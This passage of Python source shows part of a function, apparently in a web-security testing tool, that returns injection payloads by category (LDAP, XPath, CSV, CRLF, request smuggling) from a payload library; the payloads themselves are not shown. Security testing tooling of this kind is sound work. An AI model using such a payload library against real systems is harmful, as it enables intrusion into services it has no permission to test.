                "ldap": ["ldap"], "xpath": ["xpath"],
                "csv": ["csv"], "crlf": ["crlf"],
                "smuggling": ["request_smuggling"],
            }
            keys = key_map.get(category, [])
            data = {k: INJECTION_PAYLOAD_LIBRARY[k] for k in keys if k in INJECTION_PAYLOAD_LIBRARY}
        else:
            data = dict(INJECTION_PAYLOAD_LIBRARY)
        return {
            "total_payloads": sum(len(v) for v in data.values()),
            "categories": list(data.keys()),
            "payloads": data,
        }
